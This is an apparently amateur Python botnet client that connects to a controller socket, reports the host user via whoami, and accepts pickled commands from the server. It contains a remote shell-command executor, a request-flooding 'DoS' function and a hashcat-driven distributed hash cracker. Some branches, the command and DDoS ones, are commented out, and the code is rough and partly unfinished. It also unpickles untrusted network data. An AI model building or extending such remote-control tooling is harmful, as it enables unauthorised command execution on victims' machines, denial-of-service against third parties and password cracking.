from audioop import mul
import socket
import os
import subprocess
import shlex
import requests
import pickle


def execute(cmd):
    # Removing whitespace from both the sides
    cmd = cmd.strip().lower()
    split = cmd.split()
    if not cmd:
        return
    elif split[0]=="cd":
        try:
            directory = ''
            i = 1
            while i < len(split):
                directory += split[i]
                i += 1
            print(directory)
            os.chdir(directory)
            print("Hogya")
            output = os.getcwd()
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        print(output)
        return output
    else:
        output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT).decode()
        #output = subprocess.getoutput(cmd)
        print(output)
        return output

def DoS(headers="",url="http://httpbin.org/post",option='p',cookies={}):
    if option == 'p':
        print(url)
        print(cookies)
        r = requests.post(url,headers=headers,cookies=cookies)
    elif option == 'g':
        r = requests.get(url,headers=headers)
    print(r.text)

def hashcracker(wordlist):
    with open("wordlist.txt","w") as w:
        w.seek(0)
        for i in wordlist:
            w.write(i + "\n")
    os.system("hashcat -a0 -m0 --force hash.txt wordlist.txt >> out.txt")

def Handshake(socket):
    if os.path.exists("myInfo"):
        with open("myInfo","r") as f:
            name = f.readline()
        socket.send(b"Handshake Initialised from " + bytes(name,'utf-8'))
        response = socket.recv(4096)
        print(response.decode())
        return response.decode()
    else:
        socket.send(b"New Connection from '" + bytes(subprocess.getoutput('whoami'),'utf-8') + b"'. Please name the system!")
        response = socket.recv(4096)
        if response.decode():
            print("Sever assigned name: " + response.decode())
            with open("myInfo","a+") as f:
                f.write(response.decode())
        return 'ACK'
    #Receive data
    

def main():
    target_host = 'localhost'
    target_port = 9999
    #Creating a socket
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setblocking(True)
    #Connect the client
    server.connect((target_host,target_port))
    response = ''
    ack = Handshake(server)
    if ack == 'ACK':
        #Wait until command is sent
        while response != 'terminate':
            response = server.recv(4096)
            print("Hello")
            data = b""
            '''while True:
                packet = server.recv(4096)
                if not packet: break
                data += packet
                print(data)
            x = pickle.loads(server.recv(8192))
            print(x)
            #Connect
            if x[0]==1:
                print(execute(x[1].decode()))
                server.send(bytes(execute(response.decode()),'utf-8'))
            #DDoS
            elif x[0] == 2:
                print("Doing DDoS stuff")
            #Hashcracker
            elif x[0] == 3:
                pass'''
            if response:
                #Printing it once (unnecessary) This is connect ka code
                '''print(execute(response.decode()))
                server.send(bytes(execute(response.decode()),'utf-8'))'''
                #Hashcracker ka code
                myWord = pickle.loads(response)
                print(myWord)
                hashcracker(myWord)
                #Anhilate ka code
                '''req = pickle.loads(response)
                print(req)
                DoS(option='p',url=req[0],cookies=req[1])'''
                
    DoS(option='g',url='http://httpbin.org/get')
    x = input(":")

if __name__ == '__main__':
    main()